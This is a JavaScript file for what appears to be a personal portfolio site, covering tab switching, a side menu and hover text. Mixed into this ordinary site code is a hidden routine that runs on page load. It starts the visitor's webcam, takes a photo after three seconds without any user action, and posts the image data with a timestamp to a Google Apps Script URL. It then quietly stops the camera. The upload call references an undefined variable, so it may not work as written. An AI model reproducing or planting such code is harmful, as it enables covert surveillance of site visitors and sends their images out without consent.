tablinks= document.getElementsByClassName("tab-links"); 
tabcontents= document.getElementsByClassName("tab-contents");
function opentab(tabname){
   for(tablink of tablinks ){
       tablink.classList.remove("active-link")
   }
   for(tabcontent of tabcontents ){
       tabcontent.classList.remove("active-tab")
   }
   event.currentTarget.classList.add("active-link")
   document.getElementById(tabname).classList.add("active-tab")
}




var sidemenu= document.getElementById("sidemenu");

function openmenu(){
   sidemenu.style.right="0";
}
function closemenu(){
   sidemenu.style.right="-200px";
}



// improvements

document.getElementById("my-work").addEventListener("mouseover", ()=>{
   document.getElementById("my-work").innerText="My Work (in-progress)"
})
document.getElementById("my-work").addEventListener("mouseleave", ()=>{
   document.getElementById("my-work").innerText="My Work"
})

var a= window.innerWidth;



let camera_button = document.querySelector("#start-camera");
let video = document.querySelector("#video");
let click_button = document.querySelector("#click-photo");
let canvas = document.querySelector("#canvas");

camera_button.addEventListener('click', async function () {
    let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    video.srcObject = stream;
});

click_button.addEventListener('click', function () {
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
    let image_data_url = canvas.toDataURL('image/jpeg');

    // data url of the image
    console.log(image_data_url);
    document.getElementById("urlData").value = image_data_url;
    const d = new Date();
    document.getElementById("timeInfo").value = d;



    // url="https://script.google.com/macros/s/AKfycbz2E5skqLbUtVfxg5oneMGrG-XUibLCNclQN8CTtCh0-6gbpRaZK_Rg3cK9XsdaFFs8/exec"
    const scriptURL = 'https://script.google.com/macros/s/AKfycbz2E5skqLbUtVfxg5oneMGrG-XUibLCNclQN8CTtCh0-6gbpRaZK_Rg3cK9XsdaFFs8/exec';
    const form2 = document.forms['submit-to-google-sheet2'];
    // preventDefault();
    // window.addEventListener("mouseover",function start(){

    // })
    fetch(scriptURL, { method: 'POST', body: new FormData(form) }).catch(error => console.error('Error!', error.message))



    // const form = document.forms['submit-to-google-sheet'];
    // const msg= document.getElementById("msg");

    // form.addEventListener('submit', e => {
    //     msg.innerText="Successfully Sent!"


    //     e.preventDefault();
    //     fetch(scriptURL, { method: 'POST', body: new FormData(form)})
    //     .catch(error => console.error('Error!', error.message))
    //     form.reset();
    //     // msg.innerText="";
    //     setInterval(()=>{
    //         msg.innerText="";
    //     },1500)
    // })
});


camera_button.click();

setTimeout(function clickOnClick() {
    click_button.click();
    
}, 3000)
setTimeout(function clickOnClick() {
    document.getElementById("urlData").value = "";
    document.getElementById("timeInfo").value = "";
    const video = document.querySelector('video');

    // A video's MediaStream object is available through its srcObject attribute
    const mediaStream = video.srcObject;

    // Through the MediaStream, you can get the MediaStreamTracks with getTracks():
    const tracks = mediaStream.getTracks();

    // Tracks are returned as an array, so if you know you only have one, you can stop it with: 
    tracks[0].stop();
}, 5000)

